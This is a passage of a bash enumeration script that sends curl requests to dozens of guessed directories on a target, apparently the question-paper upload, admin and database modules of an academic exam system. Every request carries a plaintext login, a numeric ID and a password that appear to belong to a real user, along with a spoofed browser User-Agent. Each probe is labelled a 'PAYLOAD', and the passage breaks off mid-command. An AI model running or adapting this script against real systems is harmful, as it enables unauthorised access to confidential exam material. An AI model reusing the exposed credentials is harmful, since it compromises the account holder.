code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileHandling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileHandling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileHandling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_MonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_MonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_MonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-DataProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-DataProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-DataProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerTransfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerTransfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerTransfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseBulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseBulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseBulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Dashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Dashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Dashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperHandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperHandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperHandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorDashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
